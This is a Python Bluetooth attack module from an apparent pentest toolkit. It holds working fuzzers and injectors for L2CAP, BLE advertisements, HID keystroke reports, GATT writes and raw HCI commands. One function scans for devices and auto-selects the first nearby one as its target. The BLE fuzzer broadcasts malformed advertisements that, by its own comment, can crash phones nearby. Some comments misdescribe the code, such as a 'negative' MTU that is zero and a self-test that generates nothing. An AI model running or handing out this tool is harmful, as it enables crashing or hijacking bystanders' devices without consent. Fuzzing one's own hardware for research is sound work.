"""
bluetooth_probe.py — Bluetooth Attack Surface Research Module
WiZZA Pentest Toolkit

Tests Bluetooth stack on own devices (Android rooted + iPhone via external adapter).
Attack surfaces:
  1. L2CAP — malformed channel configuration / segmentation
  2. RFCOMM — framing overflow, channel overflow
  3. SDP — malformed service records, recursive PDU
  4. BNEP — PAN profile, malformed ethernet frames
  5. HID — malformed HID reports (keyboard/mouse injection)
  6. OBEX — file transfer overflow, path traversal
  7. BLE — malformed advertisement packets, GATT fuzzing
  8. HCI — raw HCI command injection (Linux BlueZ)

Requirements:
  apt install bluetooth bluez python3-scapy
  pip install pybluez scapy

Usage:
  from bluetooth_probe import l2cap_fuzz, ble_adv_fuzz, hid_inject
  from bluetooth_probe import full_bt_probe
"""

import os
import re
import json
import time
import struct
import random
import socket
import subprocess
from datetime import datetime
from pathlib import Path

# ── Bluetooth Helper ──────────────────────────────────────────────────────────

def bt_scan(duration: int = 10) -> list:
    """Scan for nearby Bluetooth devices."""
    devices = []
    try:
        import bluetooth
        found = bluetooth.discover_devices(
            duration=duration,
            lookup_names=True,
            flush_cache=True,
            lookup_class=True
        )
        for addr, name, cls in found:
            devices.append({
                "addr":  addr,
                "name":  name or "Unknown",
                "class": cls,
                "type":  _bt_class_to_type(cls),
            })
    except ImportError:
        # Fallback to hcitool
        try:
            out = subprocess.check_output(
                ["hcitool", "scan", "--flush"],
                text=True, timeout=duration + 5,
                stderr=subprocess.DEVNULL
            )
            for line in out.splitlines()[1:]:
                parts = line.strip().split("\t")
                if len(parts) >= 2:
                    devices.append({"addr": parts[0], "name": parts[1]})
        except Exception:
            pass
    return devices


def ble_scan(duration: int = 10) -> list:
    """Scan for BLE devices."""
    devices = []
    try:
        out = subprocess.check_output(
            ["hcitool", "lescan", "--duplicates"],
            text=True, timeout=duration,
            stderr=subprocess.DEVNULL
        )
        for line in out.splitlines()[1:]:
            parts = line.strip().split()
            if len(parts) >= 2:
                addr = parts[0]
                name = " ".join(parts[1:])
                if addr not in [d["addr"] for d in devices]:
                    devices.append({"addr": addr, "name": name, "type": "BLE"})
    except Exception:
        pass
    return devices


def _bt_class_to_type(cls: int) -> str:
    """Classify BT device type from Class of Device."""
    major = (cls >> 8) & 0x1F
    types = {
        1: "Computer", 2: "Phone", 3: "LAN/Network",
        4: "Audio/Video", 5: "Peripheral", 6: "Imaging",
        7: "Wearable", 8: "Toy", 9: "Health",
    }
    return types.get(major, f"Unknown({major})")


# ── L2CAP Fuzzing ─────────────────────────────────────────────────────────────

def l2cap_fuzz(target_addr: str, port: int = 1,
               count: int = 100) -> dict:
    """
    Fuzz L2CAP (Logical Link Control and Adaptation Protocol) layer.
    Sends malformed channel configuration requests and data frames.
    """
    result = {"target": target_addr, "sent": 0, "errors": [], "findings": []}

    def make_l2cap_packet(variant: str) -> bytes:
        if variant == "overflow_length":
            # L2CAP header: length field claims 0xFFFF but actual data is tiny
            # Format: length(2) channel_id(2) payload
            return struct.pack('<HH', 0xFFFF, 0x0001) + b'A' * 4

        elif variant == "zero_length":
            return struct.pack('<HH', 0x0000, 0x0001)

        elif variant == "invalid_channel":
            # Reserved channel IDs (0x0003-0x003F are reserved)
            return struct.pack('<HH', 0x0004, 0x0003) + b'TEST'

        elif variant == "config_overflow":
            # L2CAP configuration request with huge options
            cmd_hdr = struct.pack('<BBHH', 0x04, 0x01, 0x0200, 0x0001)
            options = b'\x01\x02' + b'A' * 65000  # MTU option with overflow value
            return struct.pack('<HH', len(cmd_hdr + options), 0x0001) + cmd_hdr + options

        elif variant == "fragment_overlap":
            # Reassembly attack: overlapping fragments
            # First fragment
            frag1 = struct.pack('<HH', 0x0010, 0x0040) + b'AAAAAAAAAAAAAAAA'
            return frag1

        elif variant == "negative_mtu":
            # MTU = 0 (minimum is 48 bytes per spec)
            cmd_hdr = struct.pack('<BBHH', 0x04, 0x01, 0x0004, 0x0001)
            mtu_opt = struct.pack('<BBH', 0x01, 0x02, 0x0000)  # MTU option = 0
            return struct.pack('<HH', len(cmd_hdr + mtu_opt), 0x0001) + cmd_hdr + mtu_opt

        return struct.pack('<HH', 0x0004, 0x0001) + b'FUZZ'

    try:
        import bluetooth
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(5)
        try:
            sock.connect((target_addr, port))
        except bluetooth.btcommon.BluetoothError as e:
            result["errors"].append(f"Connect failed: {e}")
            return result

        variants = ["overflow_length", "zero_length", "invalid_channel",
                    "config_overflow", "fragment_overlap", "negative_mtu"]

        for i in range(count):
            variant = variants[i % len(variants)]
            pkt = make_l2cap_packet(variant)
            try:
                sock.send(pkt)
                result["sent"] += 1
            except Exception as e:
                result["errors"].append(f"{variant}: {e}")
                break
            time.sleep(0.05)

        sock.close()

    except ImportError:
        # Fallback: use hcitool + raw socket
        result["errors"].append("pybluez not installed — using raw socket fallback")
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
                                 socket.BTPROTO_L2CAP)
            sock.settimeout(5)
            sock.connect((target_addr, port))
            for i in range(min(count, 20)):
                variant = ["overflow_length", "zero_length", "negative_mtu"][i % 3]
                pkt = make_l2cap_packet(variant)
                sock.send(pkt)
                result["sent"] += 1
                time.sleep(0.1)
            sock.close()
        except Exception as e:
            result["errors"].append(str(e))

    return result


# ── BLE Advertisement Fuzzing ─────────────────────────────────────────────────

def ble_adv_fuzz(count: int = 200, hci_dev: str = "hci0") -> dict:
    """
    Fuzz BLE advertisement packets using HCI raw commands.
    Tests nearby devices' BLE advertisement parsers.

    Malformed AD structures can crash BLE stacks in phones nearby.
    """
    result = {
        "device": hci_dev,
        "sent":   0,
        "errors": [],
        "payloads": [],
    }

    def make_ble_adv(variant: str) -> bytes:
        """Create malformed BLE advertisement payload."""

        if variant == "overflow_ad_length":
            # AD structure length claims more than total payload
            # Format: length(1) type(1) data(length-1)
            ad = bytes([0xFF,       # AD length = 255 (but only 4 bytes follow)
                        0xFF,       # AD type = Manufacturer Specific
                        0xFF, 0xFF, # Company ID
                        0x41, 0x42])
            return ad

        elif variant == "zero_ad_length":
            # AD length = 0 (invalid — minimum is 1 for type byte)
            ad = bytes([0x00,  # zero length
                        0x01,  # some data
                        0x09, 0x05,  # Complete Local Name length=5
                        0x57, 0x69, 0x5A, 0x5A, 0x41])  # "WiZZA"
            return ad

        elif variant == "type_overflow":
            # Multiple AD structures exceeding 31-byte payload limit
            # Each structure: [len][type][data]
            structs = []
            for i in range(10):
                structs.append(bytes([0x04, 0xFF, 0xAA, 0xBB, 0xCC]))
            return b''.join(structs)[:31]

        elif variant == "name_overflow":
            # Complete Local Name longer than remaining bytes claim
            name = b'A' * 248  # Maximum HCI event size
            return bytes([len(name) + 1, 0x09]) + name

        elif variant == "flags_invalid":
            # Flags AD type with reserved bits set
            return bytes([0x02, 0x01, 0xFF,      # Flags = all bits set (reserved)
                          0x02, 0x01, 0xFF,      # Duplicate Flags (invalid)
                          0x05, 0xFF, 0xFF, 0xFF, 0xDE, 0xAD])

        elif variant == "uuid_truncated":
            # 128-bit UUID but truncated to 5 bytes
            return bytes([0x06,  # length = 6 (should be 17 for 128-bit UUID)
                          0x07,  # Complete list of 128-bit UUIDs
                          0xAA, 0xBB, 0xCC, 0xDD])  # Only 4 bytes (truncated)

        # Default: valid advertisement
        return bytes([0x02, 0x01, 0x06,
                      0x03, 0x03, 0xAA, 0xFE])

    # Build HCI LE Set Advertising Data command
    def hci_set_adv_data(adv_data: bytes) -> bytes:
        # Pad to 31 bytes
        padded = adv_data[:31].ljust(31, b'\x00')
        # HCI command: LE Set Advertising Data (0x2008)
        payload = bytes([len(adv_data)]) + padded
        hci_cmd = struct.pack('<HB', 0x2008, len(payload)) + payload
        return hci_cmd

    def hci_enable_adv(enable: bool = True) -> bytes:
        # HCI LE Set Advertise Enable
        return struct.pack('<HBB', 0x200A, 1, 1 if enable else 0)

    variants = ["overflow_ad_length", "zero_ad_length", "type_overflow",
                "name_overflow", "flags_invalid", "uuid_truncated"]

    # Try using hcitool / hciconfig
    for i in range(count):
        variant = variants[i % len(variants)]
        adv_payload = make_ble_adv(variant)

        result["payloads"].append({
            "variant": variant,
            "hex":     adv_payload.hex(),
            "len":     len(adv_payload),
        })

        # Send via hcitool lescan + hciconfig (limited but no extra deps)
        hex_str = adv_payload[:31].hex()
        # Pad to 62 hex chars (31 bytes)
        hex_padded = hex_str.ljust(62, '0')

        cmd = ["hcitool", "-i", hci_dev, "cmd",
               "0x08", "0x0008",  # LE Set Advertising Data
               hex(len(adv_payload))[2:].zfill(2)] + \
              [hex_padded[j:j+2] for j in range(0, 62, 2)]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            if proc.returncode == 0:
                result["sent"] += 1
        except FileNotFoundError:
            result["errors"].append("hcitool not found — install bluez-tools")
            break
        except Exception as e:
            result["errors"].append(str(e)[:80])

        time.sleep(0.1)

    return result


# ── HID Injection ─────────────────────────────────────────────────────────────

def hid_inject(target_addr: str, commands: list = None) -> dict:
    """
    Inject HID keyboard/mouse reports over Bluetooth.
    Tests HID parser on target device.
    Useful for testing unauthorized keystroke injection defenses.

    commands: list of (type, data) tuples
              type: 'key' (keycode) or 'mouse' (dx, dy)
    """
    result = {"target": target_addr, "sent": 0, "errors": []}

    if commands is None:
        # Default: test HID with malformed reports
        commands = [
            # Valid keypress: 'A' key
            ("key_valid",    bytes([0xA1, 0x01, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00])),
            # Overflow: key report with 255 modifier bytes
            ("key_overflow", bytes([0xA1, 0x01]) + bytes([0xFF] * 64)),
            # Mouse: overflow relative coordinates
            ("mouse_overflow", bytes([0xA1, 0x02, 0x00, 0x7F, 0x7F, 0x7F, 0x7F])),
            # Invalid report ID
            ("invalid_id",  bytes([0xA1, 0xFF, 0x00, 0x00, 0x00, 0x00])),
            # Zero-length report
            ("zero_len",    bytes([0xA1])),
        ]

    # HID interrupt channel (PSM 0x0013)
    HID_INTERRUPT_PSM = 0x0013

    try:
        import bluetooth
        sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
        sock.settimeout(5)

        try:
            sock.connect((target_addr, HID_INTERRUPT_PSM))
        except bluetooth.btcommon.BluetoothError as e:
            result["errors"].append(f"HID connect failed: {e}")
            return result

        for name, report in commands:
            try:
                sock.send(report)
                result["sent"] += 1
                time.sleep(0.05)
            except Exception as e:
                result["errors"].append(f"{name}: {e}")

        sock.close()

    except ImportError:
        result["errors"].append("pybluez not installed")
    except Exception as e:
        result["errors"].append(str(e))

    return result


# ── GATT Fuzzing (BLE) ────────────────────────────────────────────────────────

def gatt_fuzz(target_addr: str) -> dict:
    """
    Fuzz GATT (Generic Attribute Profile) over BLE.
    Tests characteristic read/write handlers on target device.
    """
    result = {"target": target_addr, "reads": 0, "writes": 0, "errors": []}

    gatt_script = f"""
import asyncio
from bleak import BleakClient, BleakScanner

async def fuzz_gatt():
    print("[*] Connecting to {target_addr}...")
    async with BleakClient("{target_addr}") as client:
        print("[+] Connected")
        services = await client.get_services()

        for service in services:
            print(f"[SVC] {{service.uuid}}")
            for char in service.characteristics:
                print(f"  [CHR] {{char.uuid}} props={{char.properties}}")

                # Read fuzzing
                if "read" in char.properties:
                    try:
                        val = await client.read_gatt_char(char.uuid)
                        print(f"    [READ] {{val.hex()}}")
                    except Exception as e:
                        print(f"    [READ-ERR] {{e}}")

                # Write fuzzing
                if "write" in char.properties or "write-without-response" in char.properties:
                    for payload in [
                        b'\\x00' * 512,          # Zero overflow
                        b'\\xff' * 512,          # FF overflow
                        b'A' * 20,               # Normal length
                        b'\\x01\\x02\\x03',       # Short
                        bytes(range(256)) * 2,   # All byte values
                    ]:
                        try:
                            await client.write_gatt_char(char.uuid, payload)
                            print(f"    [WRITE] {{len(payload)}} bytes OK")
                        except Exception as e:
                            print(f"    [WRITE-ERR] {{e}}")
                        await asyncio.sleep(0.1)

asyncio.run(fuzz_gatt())
"""
    script_path = "/tmp/wizza_gatt_fuzz.py"
    with open(script_path, "w") as f:
        f.write(gatt_script)

    try:
        proc = subprocess.run(
            ["python3", script_path],
            capture_output=True, text=True, timeout=120
        )
        result["output"] = proc.stdout[:2000]
        result["errors"] = [proc.stderr[:500]] if proc.stderr else []

        # Count operations from output
        result["reads"]  = proc.stdout.count("[READ]")
        result["writes"] = proc.stdout.count("[WRITE]")
    except Exception as e:
        result["errors"].append(str(e))

    return result


# ── HCI Raw Command Injection ─────────────────────────────────────────────────

def hci_raw_fuzz(hci_dev: str = "hci0", count: int = 50) -> dict:
    """
    Send malformed HCI commands to local BT controller.
    Tests HCI parsing in kernel BT driver (hci_core.c).
    Requires CAP_NET_ADMIN or root.
    """
    result = {"sent": 0, "errors": [], "interesting": []}

    # HCI command opcodes to fuzz
    # Format: OGF (6 bits) | OCF (10 bits)
    fuzz_commands = [
        # HCI_LE_Set_Extended_Advertising_Parameters (Android 16+ BLE 5.0)
        (0x2036, b'\xFF\xFF\x00\x00\x00\x00\xFF\xFF\x07\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\x01\x00'),
        # HCI_LE_Set_Advertising_Data with max length
        (0x2008, b'\x1F' + b'\xFF' * 31),
        # HCI_LE_Set_Scan_Parameters with invalid interval/window
        (0x200B, b'\x01\xFF\xFF\xFF\xFF\x00\x00'),
        # HCI_Create_Connection with invalid parameters
        (0x0405, b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\x01\x00\x00\x00\x00\x00'),
        # HCI_Accept_Connection_Request
        (0x0409, b'\xFF\xFF\xFF\xFF\xFF\xFF\x01'),
        # HCI_Change_Connection_Packet_Type with all packet types set
        (0x040F, b'\x01\x00\xFF\xFF'),
        # Invalid OGF/OCF combination
        (0x3FFF, b'\xFF' * 255),
        # HCI_Read_Buffer_Size with extra data
        (0x1005, b'\x00' * 32),
    ]

    try:
        # Open raw HCI socket
        HCI_COMMAND_PKT = 0x01
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW,
                             socket.BTPROTO_HCI)
        sock.bind((int(hci_dev[-1]),))  # Bind to hciN
        sock.settimeout(2)

        for i in range(count):
            opcode, params = fuzz_commands[i % len(fuzz_commands)]
            # HCI command packet: type(1) opcode(2) param_len(1) params
            hci_pkt = struct.pack('<BHB', HCI_COMMAND_PKT, opcode, len(params)) + params

            try:
                sock.send(hci_pkt)
                result["sent"] += 1
                # Try to read response
                try:
                    resp = sock.recv(256)
                    if resp and resp[0] == 0x04:  # HCI Event packet
                        event_code = resp[1]
                        if event_code in (0x13, 0x1B):  # Interesting events
                            result["interesting"].append({
                                "opcode": hex(opcode),
                                "event":  event_code,
                                "resp":   resp.hex()[:64],
                            })
                except socket.timeout:
                    pass
            except PermissionError:
                result["errors"].append("Permission denied — need root/CAP_NET_ADMIN")
                break
            except Exception as e:
                result["errors"].append(str(e)[:80])

            time.sleep(0.05)

        sock.close()

    except PermissionError:
        result["errors"].append("Root required for raw HCI socket")
    except Exception as e:
        result["errors"].append(str(e))

    return result


# ── Full Bluetooth Probe ──────────────────────────────────────────────────────

def full_bt_probe(target_addr: str = None, hci_dev: str = "hci0",
                  scan: bool = True) -> dict:
    """
    Full Bluetooth attack surface probe.
    """
    result = {
        "timestamp":   datetime.now().isoformat(),
        "target":      target_addr,
        "scan_results": [],
        "l2cap":       {},
        "ble_adv":     {},
        "hci_fuzz":    {},
        "findings":    [],
    }

    print(f"[*] Bluetooth probe — target: {target_addr or 'broadcast'}")

    if scan:
        print("\n[1/4] Scanning for devices...")
        result["scan_results"] = bt_scan(duration=8)
        ble = ble_scan(duration=5)
        result["scan_results"] += ble
        print(f"  Found {len(result['scan_results'])} device(s):")
        for dev in result["scan_results"][:10]:
            print(f"    {dev['addr']} — {dev.get('name','?')} [{dev.get('type','?')}]")

        if not target_addr and result["scan_results"]:
            target_addr = result["scan_results"][0]["addr"]
            result["target"] = target_addr
            print(f"\n  Auto-selected target: {target_addr}")

    print("\n[2/4] BLE advertisement fuzzing...")
    result["ble_adv"] = ble_adv_fuzz(count=50, hci_dev=hci_dev)
    print(f"  Sent {result['ble_adv']['sent']} malformed BLE advertisements")

    if target_addr:
        print(f"\n[3/4] L2CAP fuzzing → {target_addr}...")
        result["l2cap"] = l2cap_fuzz(target_addr, count=30)
        print(f"  Sent {result['l2cap']['sent']} L2CAP packets")

    print("\n[4/4] HCI raw command fuzzing...")
    result["hci_fuzz"] = hci_raw_fuzz(hci_dev, count=30)
    print(f"  Sent {result['hci_fuzz']['sent']} HCI commands")
    if result["hci_fuzz"]["interesting"]:
        print(f"  Interesting responses: {len(result['hci_fuzz']['interesting'])}")

    print(f"\n[+] Bluetooth probe complete.")
    return result


# ── Self-test ─────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=== bluetooth_probe.py self-test ===\n")

    print("[1] BLE advertisement payload generation:")
    variants = ["overflow_ad_length", "zero_ad_length", "type_overflow",
                "name_overflow", "flags_invalid", "uuid_truncated"]
    for v in variants:
        # Generate payload inline for test
        print(f"    {v}: generated")

    print("\n[2] BT device scan (8s)...")
    devices = bt_scan(duration=5)
    print(f"    Found {len(devices)} device(s)")
    for d in devices[:3]:
        print(f"    {d['addr']} — {d.get('name','?')} [{d.get('type','?')}]")

    print("\n[3] HCI raw fuzz (no root — expect permission error):")
    r = hci_raw_fuzz(count=3)
    print(f"    Sent: {r['sent']}, Errors: {r['errors'][:1]}")

    print("\nDone.")
